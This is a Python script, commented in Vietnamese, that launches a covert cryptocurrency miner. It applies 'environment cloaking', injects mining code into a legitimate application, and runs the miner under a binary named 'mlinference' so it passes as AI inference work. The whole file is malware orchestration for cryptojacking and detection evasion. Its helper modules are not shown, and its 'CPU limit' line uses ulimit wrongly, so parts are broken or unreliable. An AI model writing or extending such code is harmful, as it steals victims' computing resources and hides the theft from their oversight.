import os
import logging
import json
from ai_environment_cloaking import EnvironmentCloaker
from inject_code import CodeInjector
import subprocess

# Thiết lập logging cho các hoạt động khai thác và ngụy trang
logging.basicConfig(filename='/app/logs/mining_activity.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def load_config(file_path):
    """Load cấu hình từ file JSON."""
    with open(file_path, 'r') as file:
        return json.load(file)

def initialize_environment():
    """Khởi tạo các thành phần cần thiết cho môi trường khai thác."""
    logging.info("Khởi tạo môi trường khai thác...")
    try:
        # Tải cấu hình từ các file cần thiết
        cloaking_params = load_config('/app/config/cloaking_params.json')
        resource_limits = load_config('/app/config/resource_limits.json')

        # Khởi tạo công cụ ngụy trang môi trường AI
        cloaker = EnvironmentCloaker(cloaking_params)
        cloaker.apply_cloaking()

        # Giới hạn tài nguyên hệ thống theo cấu hình
        os.system(f"ulimit -u {resource_limits['cpu_limit']}")  # Giới hạn CPU
        logging.info("Môi trường đã được thiết lập với các giới hạn tài nguyên.")
    except Exception as e:
        logging.error("Lỗi trong quá trình khởi tạo môi trường: %s", e)
        raise

def start_mining():
    """Bắt đầu hoạt động khai thác tiền điện tử sử dụng mlinference."""
    logging.info("Bắt đầu hoạt động khai thác với mlinference...")
    try:
        mining_command = ["mlinference", "--config=/app/config/mlinference_config.json"]
        
        # Khởi chạy quá trình khai thác dưới dạng subprocess
        process = subprocess.Popen(mining_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        logging.info("Hoạt động khai thác đã khởi động thành công với lệnh: %s", mining_command)
        
        # Ghi lại output của quá trình khai thác
        for line in iter(process.stdout.readline, b''):
            logging.info("Mining output: %s", line.decode().strip())
        
        process.stdout.close()
        process.wait()
    except Exception as e:
        logging.error("Lỗi trong quá trình khai thác với mlinference: %s", e)
        raise

def main():
    """Điều khiển chính của chương trình."""
    try:
        # Thiết lập môi trường
        initialize_environment()
        
        # Tiêm mã khai thác vào ứng dụng hợp pháp nếu cần thiết
        injector = CodeInjector()
        injector.inject_code()

        # Bắt đầu khai thác với ngụy trang AI sử dụng mlinference
        start_mining()

        logging.info("Hoạt động khai thác đã kết thúc.")
    except Exception as e:
        logging.error("Lỗi trong quá trình thực thi chính: %s", e)

if __name__ == "__main__":
    main()
